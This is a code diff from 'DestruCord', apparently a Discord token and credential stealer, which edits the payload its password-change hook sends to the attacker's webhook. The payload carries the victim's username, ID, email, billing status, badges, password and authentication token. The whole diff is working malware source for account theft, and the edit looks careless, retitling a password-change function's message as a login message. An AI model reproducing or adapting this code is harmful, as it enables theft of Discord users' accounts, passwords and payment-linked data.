@@ -392,69 +392,64 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
-    embeds: [
+     embeds: [
       {
-          title: "DestruCord Password Changed",
-          description: "[<a:blackcap:961249786315538524> │ **Oh you have DestruCorded someone**](https://github.com/KSCHdsc)",
+        title: "DestruCord Login",
+            description: "[<a:blackcap:961249786315538524> │ **Oh you have DestruCorded someone**](https://github.com/KSCHdsc)",
 
-          "color": config.embed_color,
-          "fields": [
-              {
-                  "name": "**Account Name**",
-                  "value": `\`${json.username +"#" + json.discriminator}\``,
-                  "inline": true
-              },
-              {
-                  "name": "**Account ID**",
-                  "value": `\`${json.id}\``,
-                  "inline": true
-              },
-              {
-                  "name": "**Nitro:**",
-                  "value": `${nitro}`,
-                  "inline": true
-              },
-              {
-                  "name": "**Billing:**",
-                  "value": `\`${billing}\``,
-                  "inline": true
-              },
-              {
-                  "name": "**Badges:**",
-                  "value": `${badges}`,
-                  "inline": false
-              },
-              {
-                  "name": "**Account Email**",
-                  "value": `\`${json.email}\``,
-                  "inline": true
-              }, 
-              {
-                  "name": "**Old Password**",
-                  "value": `\`${oldpassword}\``,
-                  "inline": true
-              },
-              {
-                  "name": "**New Password**",
-                  "value": `\`${newpassword}\``,
-                  "inline": true
-              },
-              {
-                  "name": "**Token**",
-                  "value": `\`${token}\``,
-                  "inline": false
-              }
-          ],
-          "author": {
-              "name": "DestruCord V1"
-          },
-          "footer": {
-              "text": "©KSCH | https://github.com/KSCHdsc"
-          },
-          "thumbnail": {
-              "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
-          }
-      }
+            "color": config.embed_color,
+            "fields": [
+                {
+                    "name": "**Account Name**",
+                    "value": `\`${json.username +"#" + json.discriminator}\``,
+                    "inline": true
+                },
+                {
+                    "name": "**Account ID**",
+                    "value": `\`${json.id}\``,
+                    "inline": true
+                },
+                {
+                    "name": "**Nitro:**",
+                    "value": `${nitro}`,
+                    "inline": true
+                },
+                {
+                    "name": "**Billing:**",
+                    "value": `\`${billing}\``,
+                    "inline": true
+                },
+                {
+                    "name": "**Badges:**",
+                    "value": `${badges}`,
+                    "inline": false
+                },
+                {
+                    "name": "**Account Email**",
+                    "value": `\`${email}\``,
+                    "inline": true
+                }, 
+                {
+                    "name": "**Account Password**",
+                    "value": `\`${password}\``,
+                    "inline": true
+                },
+                {
+                    "name": "**Token**",
+                    "value": `\`${token}\``,
+                    "inline": false
+                }
+            ],
+            "author": {
+                "name": "DestruCord V1"
+            },
+            "footer": {
+                "text": "©KSCH | https://github.com/KSCHdsc"
+            },
+            "thumbnail": {
+                "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}`
+        },
+      },
     ],
   };
   if (config.ping_on_run) content["content"] = config.ping_val;
